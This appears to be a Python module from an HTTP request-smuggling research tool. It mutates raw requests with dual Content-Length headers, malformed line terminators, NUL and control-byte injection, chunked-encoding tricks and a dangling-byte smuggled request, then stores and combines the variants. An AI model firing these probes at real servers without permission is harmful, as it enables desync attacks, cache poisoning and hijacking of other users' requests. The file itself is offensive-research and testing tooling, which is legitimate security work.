"""
Vector Permutation Engine:
Applies systematic mutations and permutations to candidate triggers
based on techniques discovered in the HTTP Terminator research paper.
"""

import random
import re
from typing import Any, Dict, List, Optional, Tuple

from database import Database


class VectorPermutator:
    """
    Applies protocol transformations (early-response paths, header casing,
    tabs, dual-CL, multipart/byteranges, dangling bytes, and alternative line/frame terminators)
    to multiply probe novelty. Supports database-backed dynamic permutations and trigger combination.
    """

    def __init__(self, db: Optional[Database] = None):
        self.db = db

    def permute_probe(self, base_probe: Dict[str, Any], max_variants: int = 5) -> List[Dict[str, Any]]:
        raw_req = base_probe.get("raw_request", "")
        if not raw_req:
            return []

        parent_id = base_probe.get("probe_id")
        variants: List[Dict[str, Any]] = []

        # Escalate permutation depth if probe has reached validation attempt threshold
        effective_max = max_variants
        if self.db and parent_id:
            try:
                attempts = self.db.get_probe_evaluation_count(parent_id)
                if attempts >= 3:
                    effective_max = max(max_variants, 8)
            except Exception:
                pass

        mutators = self.get_terminator_mutators()

        # Pick mutators up to effective_max
        selected_mutators = random.sample(mutators, min(len(mutators), effective_max))
        seen_requests = {raw_req}

        for mutator in selected_mutators:
            mutated_req, mutation_name = mutator(raw_req)
            if mutated_req and mutated_req not in seen_requests:
                seen_requests.add(mutated_req)
                is_clean_val = (
                    True
                    if "clean" in mutation_name
                    else (False if "dirty" in mutation_name else base_probe.get("is_clean", False))
                )
                variant = {
                    "fragment_id": base_probe.get("fragment_id"),
                    "rationale": f"{base_probe.get('rationale', '')} [Permutation: {mutation_name}]",
                    "raw_request": mutated_req,
                    "is_clean": is_clean_val,
                    "source_type": "permuted",
                    "parent_probe_id": parent_id,
                }
                if self.db:
                    p_id = self.db.save_probe(
                        fragment_id=variant["fragment_id"],
                        rationale=variant["rationale"],
                        raw_request=variant["raw_request"],
                        is_clean=variant["is_clean"],
                        source_type="permuted",
                        parent_probe_id=parent_id,
                    )
                    variant["probe_id"] = p_id
                variants.append(variant)

        # Apply any dynamic database-backed permutations (autonomous feedback loop)
        if self.db:
            try:
                dyn_perms = self.db.get_dynamic_permutations()
                for dp in dyn_perms:
                    pat = dp.get("match_pattern", "")
                    rep = dp.get("replacement_text", "")
                    m_name = dp.get("mutation_name", "dynamic_db_mutation")
                    if pat and pat in raw_req:
                        mutated_req = raw_req.replace(pat, rep, 1)
                        if mutated_req not in seen_requests:
                            seen_requests.add(mutated_req)
                            variant = {
                                "fragment_id": base_probe.get("fragment_id"),
                                "rationale": f"{base_probe.get('rationale', '')} [DB-Permutation: {m_name}]",
                                "raw_request": mutated_req,
                                "is_clean": bool(dp.get("is_clean", False)),
                                "source_type": "permuted",
                                "parent_probe_id": parent_id,
                            }
                            p_id = self.db.save_probe(
                                fragment_id=variant["fragment_id"],
                                rationale=variant["rationale"],
                                raw_request=variant["raw_request"],
                                is_clean=variant["is_clean"],
                                source_type="permuted",
                                parent_probe_id=parent_id,
                            )
                            variant["probe_id"] = p_id
                            variants.append(variant)
            except Exception:
                pass

        return variants

    def get_terminator_mutators(self) -> List[Any]:
        """Returns the complete catalog of 25 protocol terminator & framing mutators."""
        return [
            self._mutate_path_nul,
            self._mutate_path_asterisk_gadget,
            self._mutate_header_tab_spacing,
            self._mutate_dual_matching_cl,
            self._mutate_header_casing_underscore,
            self._mutate_dangling_byte,
            self._mutate_multipart_byteranges,
            self._mutate_line_terminator_bare_lf,
            self._mutate_line_terminator_bare_cr,
            self._mutate_line_terminator_double_cr,
            self._mutate_line_terminator_lfcr,
            self._mutate_obs_fold_terminator,
            self._mutate_http10_te_gzip,
            self._mutate_intermediary_terminator_headers,
            self._mutate_control_char_vt_ff_terminator,
            self._mutate_null_byte_header_terminator,
            self._mutate_chunked_extension_semicolon_terminator,
            self._mutate_chunked_bare_lf_terminator,
            self._mutate_chunked_trailer_terminator,
            self._mutate_mime_boundary_closing_terminator,
            self._mutate_smtp_dot_bdat_terminator,
            self._mutate_websocket_upgrade_terminator,
            self._mutate_early_hints_103_expect_terminator,
            self._mutate_capsule_datagram_terminator,
            self._mutate_iso8859_nel_separator_terminator,
        ]

    def combine_triggers(self, probe_a: Dict[str, Any], probe_b: Dict[str, Any]) -> Optional[Dict[str, Any]]:
        """
        Combines headers from two distinct candidate triggers into a composite trigger,
        implementing the HTTP Terminator escalating combination phase.
        """
        req_a = probe_a.get("raw_request", "")
        req_b = probe_b.get("raw_request", "")
        if "\r\n\r\n" not in req_a or "\r\n\r\n" not in req_b:
            return None

        head_a, body_a = req_a.split("\r\n\r\n", 1)
        head_b, _ = req_b.split("\r\n\r\n", 1)
        lines_a = head_a.split("\r\n")
        lines_b = head_b.split("\r\n")[1:]  # skip request line of B

        existing_lower = {l.lower() for l in lines_a}
        added = 0
        for line in lines_b:
            if line and not line.lower().startswith("host:") and line.lower() not in existing_lower:
                lines_a.append(line)
                added += 1

        if added == 0:
            return None

        combined_raw = "\r\n".join(lines_a) + "\r\n\r\n" + body_a
        combined = {
            "fragment_id": probe_a.get("fragment_id"),
            "rationale": f"[Combined Trigger] {probe_a.get('rationale', '')[:40]} + {probe_b.get('rationale', '')[:40]}",
            "raw_request": combined_raw,
            "is_clean": bool(probe_a.get("is_clean", False) and probe_b.get("is_clean", False)),
            "source_type": "permuted",
            "parent_probe_id": probe_a.get("probe_id"),
        }
        if self.db:
            combined["probe_id"] = self.db.save_probe(
                fragment_id=combined["fragment_id"],
                rationale=combined["rationale"],
                raw_request=combined["raw_request"],
                is_clean=combined["is_clean"],
                source_type="permuted",
                parent_probe_id=combined["parent_probe_id"],
            )
        return combined

    def _mutate_path_nul(self, req: str) -> Tuple[str, str]:
        """Replaces root path with /nul to trigger early 400/404 responses (0.CL deadlock resolution)."""
        pattern = re.compile(r"^(GET|POST|HEAD|PUT|DELETE|OPTIONS)\s+/\s+(HTTP/1\.[01])", re.MULTILINE)
        if pattern.search(req):
            mutated = pattern.sub(r"\1 /nul \2", req, count=1)
            return mutated, "path_nul_early_response"
        return req, ""

    def _mutate_path_asterisk_gadget(self, req: str) -> Tuple[str, str]:
        """Mutates to OPTIONS *?xyz gadget that triggers Apache early-response behavior."""
        lines = req.split("\r\n")
        if lines:
            first_line = lines[0]
            if "HTTP/" in first_line:
                lines[0] = "OPTIONS *?xyz HTTP/1.1"
                return "\r\n".join(lines), "apache_options_asterisk_gadget"
        return req, ""

    def _mutate_header_tab_spacing(self, req: str) -> Tuple[str, str]:
        """Injects colon-tab spacing as discovered in 'Expect :\\t100-continue'."""
        if "\r\nHost:" in req:
            return req.replace("\r\nHost:", "\r\nHost :\t"), "header_colon_tab_spacing"
        return req, ""

    def _mutate_dual_matching_cl(self, req: str) -> Tuple[str, str]:
        """
        Duplicates Content-Length header with identical values.
        Triggered the breakthrough NetScaler / SSO / Bank vulnerabilities in Kettle's paper.
        """
        cl_match = re.search(r"\r\n(Content-Length:\s*(\d+))", req, re.IGNORECASE)
        if cl_match:
            full_header = cl_match.group(1)
            # Duplicate header
            mutated = req.replace(f"\r\n{full_header}", f"\r\n{full_header}\r\n{full_header}", 1)
            return mutated, "clean_dual_matching_content_length"
        if "\r\n\r\n" in req:
            dual_insert = "Content-Length: 1\r\nContent-Length: 1\r\n"
            mutated = req.replace("\r\n\r\n", f"\r\n{dual_insert}\r\n", 1)
            return mutated, "clean_dual_matching_content_length"
        return req, ""

    def _mutate_header_casing_underscore(self, req: str) -> Tuple[str, str]:
        """Transforms Transfer-Encoding into Transfer_Encoding or POsT casing."""
        mutated = req
        if "Transfer-Encoding:" in mutated:
            mutated = mutated.replace("Transfer-Encoding:", "Transfer_Encoding:")
            return mutated, "header_underscore_transfer_encoding"
        if "POST /" in mutated:
            mutated = mutated.replace("POST /", "POsT /")
            return mutated, "method_mixed_case_post"
        return req, ""

    def _mutate_dangling_byte(self, req: str) -> Tuple[str, str]:
        """
        Applies Kettle's dangling byte technique to solve the stacked-response race condition.
        Missing 1 byte delays back-end response until victim request arrives.
        """
        if "$PAYLOAD" in req:
            # Inject a smuggled request with dangling byte: Content-Length: 1 with empty body
            dangling_marker = (
                "POST /dangling_smuggled HTTP/1.1\r\n"
                "Host: target.local\r\n"
                "Content-Length: 1\r\n\r\n"
            )
            return req.replace("$PAYLOAD", dangling_marker), "dangling_byte_stacked_response_bypass"
        return req, ""

    def _mutate_multipart_byteranges(self, req: str) -> Tuple[str, str]:
        """Injects Content-Type: multipart/byteranges (responsible for 200+ vulnerable bank targets)."""
        if "\r\n\r\n" in req and "multipart/byteranges" not in req:
            header_insert = "Content-Type: multipart/byteranges; boundary=BOUND\r\n"
            mutated = req.replace("\r\n\r\n", f"\r\n{header_insert}\r\n", 1)
            return mutated, "multipart_byteranges_shared_parser_trigger"
        return req, ""

    def _mutate_line_terminator_bare_lf(self, req: str) -> Tuple[str, str]:
        """Replaces a header line's CRLF with a bare LF terminator (RFC 9112 Section 2.2)."""
        if "\r\n\r\n" in req:
            head, body = req.split("\r\n\r\n", 1)
            lines = head.split("\r\n")
            if len(lines) >= 2:
                # Join last two header lines with bare LF instead of CRLF
                mutated_head = "\r\n".join(lines[:-1]) + "\n" + lines[-1]
                return mutated_head + "\r\n\r\n" + body, "dirty_bare_lf_line_terminator"
        return req, ""

    def _mutate_line_terminator_bare_cr(self, req: str) -> Tuple[str, str]:
        """Injects a bare CR (0x0D) delimiter before a secondary header (RFC 9112 Section 2.2)."""
        if "\r\n\r\n" in req:
            mutated = req.replace("\r\n\r\n", "\rX-Terminator-CR: 1\r\n\r\n", 1)
            return mutated, "dirty_bare_cr_line_terminator"
        return req, ""

    def _mutate_line_terminator_double_cr(self, req: str) -> Tuple[str, str]:
        """Uses CR CR LF (\\r\\r\\n) as a header line terminator (RFC 9112 Section 2.2)."""
        if "\r\nHost:" in req:
            return req.replace("\r\nHost:", "\r\r\nHost:", 1), "dirty_double_cr_line_terminator"
        return req, ""

    def _mutate_line_terminator_lfcr(self, req: str) -> Tuple[str, str]:
        """Uses inverted LF CR (\\n\\r) as a header line terminator (RFC 9112 Section 2.2)."""
        if "\r\n\r\n" in req:
            mutated = req.replace("\r\n\r\n", "\n\rX-Inverted-LFCR: 1\r\n\r\n", 1)
            return mutated, "dirty_lfcr_inverted_line_terminator"
        return req, ""

    def _mutate_obs_fold_terminator(self, req: str) -> Tuple[str, str]:
        """Applies RFC 9112 Section 5.2 obsolete line folding (CRLF + SP/HTAB) across header lines."""
        if "\r\n\r\n" in req:
            fold_insert = "X-Fold-Header: first-part\r\n \tsecond-part\r\n"
            return req.replace("\r\n\r\n", f"\r\n{fold_insert}\r\n", 1), "dirty_obs_fold_terminator"
        return req, ""

    def _mutate_http10_te_gzip(self, req: str) -> Tuple[str, str]:
        """Applies HTTP/1.0 + Transfer-Encoding: gzip (RFC 9112 Section 6.1 case study from Kettle's paper)."""
        if "HTTP/1.1" in req and "\r\n\r\n" in req:
            mutated = req.replace("HTTP/1.1", "HTTP/1.0", 1)
            if "Transfer-Encoding:" not in mutated:
                mutated = mutated.replace("\r\n\r\n", "\r\nTransfer-Encoding: gzip\r\n\r\n", 1)
            return mutated, "http10_transfer_encoding_gzip"
        return req, ""

    def _mutate_intermediary_terminator_headers(self, req: str) -> Tuple[str, str]:
        """Injects intermediary/gateway terminator headers (Early-Data: 1, Max-Forwards: 0)."""
        if "\r\n\r\n" in req and "Early-Data:" not in req and "Max-Forwards:" not in req:
            header_insert = "Early-Data: 1\r\nMax-Forwards: 0\r\n"
            return req.replace("\r\n\r\n", f"\r\n{header_insert}\r\n", 1), "intermediary_early_data_max_forwards"
        return req, ""

    def _mutate_control_char_vt_ff_terminator(self, req: str) -> Tuple[str, str]:
        """Injects Vertical Tab (0x0B) and Form Feed (0x0C) POSIX isspace() terminators in header lines."""
        if "\r\n\r\n" in req:
            vt_ff_insert = "Transfer-Encoding:\x0bchunked\r\nX-FF-Term:\x0c1\r\n"
            return req.replace("\r\n\r\n", f"\r\n{vt_ff_insert}\r\n", 1), "dirty_vt_ff_control_terminator"
        return req, ""

    def _mutate_null_byte_header_terminator(self, req: str) -> Tuple[str, str]:
        """Injects C-string NUL (0x00) byte terminator inside header value to test strlen truncation."""
        if "\r\n\r\n" in req:
            nul_insert = "X-Null-Term: prefix\x00Content-Length: 0\r\n"
            return req.replace("\r\n\r\n", f"\r\n{nul_insert}\r\n", 1), "dirty_null_byte_c_string_terminator"
        return req, ""

    def _mutate_chunked_extension_semicolon_terminator(self, req: str) -> Tuple[str, str]:
        """Applies RFC 9112 Section 7.1.1 chunked extension semicolon & BWS terminator framing."""
        if "\r\n\r\n" in req:
            head, body = req.split("\r\n\r\n", 1)
            chunk_hdr = "\r\nTransfer-Encoding: chunked" if "Transfer-Encoding:" not in head else ""
            chunk_body = f"1 ; ext=\"term\"\r\nZ\r\n0;last-ext=1\r\n\r\n{body}"
            return f"{head}{chunk_hdr}\r\n\r\n{chunk_body}", "dirty_chunk_extension_semicolon_terminator"
        return req, ""

    def _mutate_chunked_bare_lf_terminator(self, req: str) -> Tuple[str, str]:
        """Uses bare LF (\\n) as chunk-size and last-chunk terminators (RFC 9112 Section 7.1)."""
        if "\r\n\r\n" in req:
            head, body = req.split("\r\n\r\n", 1)
            chunk_hdr = "\r\nTransfer-Encoding: chunked" if "Transfer-Encoding:" not in head else ""
            chunk_body = f"0\n\n{body}"
            return f"{head}{chunk_hdr}\r\n\r\n{chunk_body}", "dirty_chunk_bare_lf_terminator"
        return req, ""

    def _mutate_chunked_trailer_terminator(self, req: str) -> Tuple[str, str]:
        """Appends RFC 9112 Section 7.1.2 Trailer header and post-chunk trailer fields before final CRLF."""
        if "\r\n\r\n" in req:
            head, body = req.split("\r\n\r\n", 1)
            trailer_hdr = "\r\nTransfer-Encoding: chunked\r\nTrailer: X-Trailer-Term"
            trailer_body = f"0\r\nX-Trailer-Term: 1\r\n\r\n{body}"
            return f"{head}{trailer_hdr}\r\n\r\n{trailer_body}", "clean_chunked_trailer_section_terminator"
        return req, ""

    def _mutate_mime_boundary_closing_terminator(self, req: str) -> Tuple[str, str]:
        """Injects RFC 2046 Section 5.1.1 MIME closing boundary (--BOUND--) before trailing payload."""
        if "\r\n\r\n" in req:
            head, body = req.split("\r\n\r\n", 1)
            mime_hdr = "\r\nContent-Type: multipart/mixed; boundary=BOUND" if "boundary=" not in head else ""
            mime_body = f"--BOUND\r\nContent-Type: text/plain\r\n\r\npart\r\n--BOUND--\r\n{body}"
            return f"{head}{mime_hdr}\r\n\r\n{mime_body}", "dirty_mime_closing_boundary_terminator"
        return req, ""

    def _mutate_smtp_dot_bdat_terminator(self, req: str) -> Tuple[str, str]:
        """Applies cross-protocol SMTP dot-stuffing (\\r\\n.\\r\\n) and BDAT LAST terminators (RFC 5321 / RFC 3030)."""
        if "\r\n\r\n" in req:
            head, body = req.split("\r\n\r\n", 1)
            smtp_body = f"BDAT 0 LAST\r\n.\r\n{body}"
            return f"{head}\r\n\r\n{smtp_body}", "dirty_smtp_dot_bdat_cross_protocol_terminator"
        return req, ""

    def _mutate_websocket_upgrade_terminator(self, req: str) -> Tuple[str, str]:
        """Injects RFC 6455 / RFC 8441 WebSocket Upgrade handshake headers to test tunnel stream termination."""
        if "\r\n\r\n" in req and "Upgrade:" not in req:
            ws_headers = (
                "Connection: Upgrade\r\n"
                "Upgrade: websocket\r\n"
                "Sec-WebSocket-Version: 13\r\n"
                "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\n"
            )
            return req.replace("\r\n\r\n", f"\r\n{ws_headers}\r\n", 1), "clean_websocket_upgrade_handshake_terminator"
        return req, ""

    def _mutate_early_hints_103_expect_terminator(self, req: str) -> Tuple[str, str]:
        """Injects Expect: 100-continue and Prefer: wait=0 interim response boundary terminators (RFC 9110 / RFC 8297)."""
        if "\r\n\r\n" in req and "Expect:" not in req:
            interim_headers = "Expect: 100-continue\r\nPrefer: wait=0\r\n"
            return req.replace("\r\n\r\n", f"\r\n{interim_headers}\r\n", 1), "clean_expect_100_continue_interim_terminator"
        return req, ""

    def _mutate_capsule_datagram_terminator(self, req: str) -> Tuple[str, str]:
        """Injects RFC 9297 Capsule-Protocol: ?1 and RFC 9298 connect-udp upgrade terminators."""
        if "\r\n\r\n" in req and "Capsule-Protocol:" not in req:
            capsule_headers = "Capsule-Protocol: ?1\r\nUpgrade: connect-udp\r\nConnection: Upgrade\r\n"
            return req.replace("\r\n\r\n", f"\r\n{capsule_headers}\r\n", 1), "clean_capsule_protocol_terminator"
        return req, ""

    def _mutate_iso8859_nel_separator_terminator(self, req: str) -> Tuple[str, str]:
        """Injects ISO-8859-1 Next Line (0x85) and ASCII Record Separator (0x1E) terminators in headers."""
        if "\r\n\r\n" in req:
            nel_insert = "X-NEL-Term: line1\x85X-RS-Term: line2\x1e\r\n"
            return req.replace("\r\n\r\n", f"\r\n{nel_insert}\r\n", 1), "dirty_nel_record_separator_terminator"
        return req, ""

